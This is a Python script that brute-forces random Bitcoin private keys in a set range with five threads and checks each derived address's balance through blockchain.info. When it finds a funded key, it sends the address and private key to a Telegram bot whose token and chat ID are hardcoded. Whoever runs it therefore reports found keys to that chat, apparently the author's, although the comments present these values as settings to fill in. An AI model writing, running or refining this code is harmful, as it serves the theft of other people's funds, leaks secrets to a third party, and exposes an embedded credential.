import random
import threading
import urllib.request
import http.client
import urllib.error
import time
from bitcoin import *
import requests


total_generated = 0
total_no_balance = 0
total_with_balance = 0
counter_lock = threading.Lock()

# Telegram configuration (you need to set these values)
TELEGRAM_BOT_TOKEN = "8256482135:AAGy6mYws_H7Gq7qrC3dxZNtU68_opf4sU4"
TELEGRAM_CHAT_ID = "6651334825"

def send_telegram_notification(address, private_key):
    try:
        message = f"💰 Bitcoin Balance Found!\n\nAddress: {address}\nPrivate Key: {private_key}"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Telegram notification sent successfully!")
        else:
            print(f"Failed to send Telegram notification: {response.text}")
    except Exception as e:
        print(f"Error sending Telegram notification: {str(e)}")

def generate_private_key(start_range, end_range):
    global total_generated
    private_key_int = random.randint(start_range, end_range)
    with counter_lock:
        total_generated += 1
    return hex(private_key_int)[2:].zfill(64)

def check_balance(private_key_hex):
    global total_no_balance, total_with_balance

    try:
        # Use the correct function from bitcoin library
        generated_address = privtoaddr(private_key_hex)
        contents = urllib.request.urlopen("https://blockchain.info/q/getreceivedbyaddress/" + generated_address).read()
        balance = int(contents.decode('UTF8'))

        if balance is not None:
            if balance > 0:
                with counter_lock:
                    total_with_balance += 1
                print("Balance found!")
                
                send_telegram_notification(generated_address, private_key_hex)
            else:
                with counter_lock:
                    total_no_balance += 1

    except urllib.error.URLError as e:
        print(f"URL Error: {str(e)}")
        time.sleep(2)
    except http.client.RemoteDisconnected:
        print("Remote disconnected error")
        time.sleep(2)
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        time.sleep(2)

def generate_and_check_loop(start_range, end_range):
    try:
        while True:
            private_key_hex = generate_private_key(start_range, end_range)
            check_balance(private_key_hex)
    except KeyboardInterrupt:
        print("\nExecution stopped by user.")

def monitor_counters():
    while True:
        with counter_lock:
            print(f"Total generated: {total_generated} | With balance: {total_with_balance} | No balance: {total_no_balance}")
        time.sleep(30)  # Print every 30 seconds

def main():
    start_range = int("492f8cee603b98917dddbca5d2a23b49d7375d75b800220d1c4654750965e814", 16)
    end_range = int("c362de93d9e04119a6ad25490a07220942853f094e70781d3f1949ad60253350", 16)
    num_threads = 5

    # Check if Telegram credentials are set
    if TELEGRAM_BOT_TOKEN == "8256482135:AAGy6mYws_H7Gq7qrC3dxZNtU68_opf4sU4" or TELEGRAM_CHAT_ID == "6651334825":
        print("Warning: Telegram notifications are not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.")
    
    # Start the monitor thread
    monitor_thread = threading.Thread(target=monitor_counters)
    monitor_thread.daemon = True  # Set as daemon so it exits when main thread exits
    monitor_thread.start()

    # Start the worker threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=generate_and_check_loop, args=(start_range, end_range))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("All threads have completed.")

if __name__ == "__main__":
    main()